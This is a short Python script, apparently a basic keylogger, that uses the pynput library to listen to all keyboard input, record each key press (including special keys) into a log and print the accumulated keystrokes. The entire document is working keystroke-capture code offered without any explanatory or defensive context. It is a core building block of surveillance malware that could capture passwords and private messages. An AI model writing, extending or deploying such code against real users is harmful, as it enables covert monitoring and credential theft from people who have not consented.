#!/usr/bin/env python

import pynput.keyboard

log = []

def process_key_press(key):
    global log
    try:
        log.append(f'{str(key.char)}')
    except AttributeError:
        if key == key.space:
            log.append(" ")
        elif key == key.shift:
            log.append('')
        else:
            log.append(f'{str(key)}')
    print(''.join(log))

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()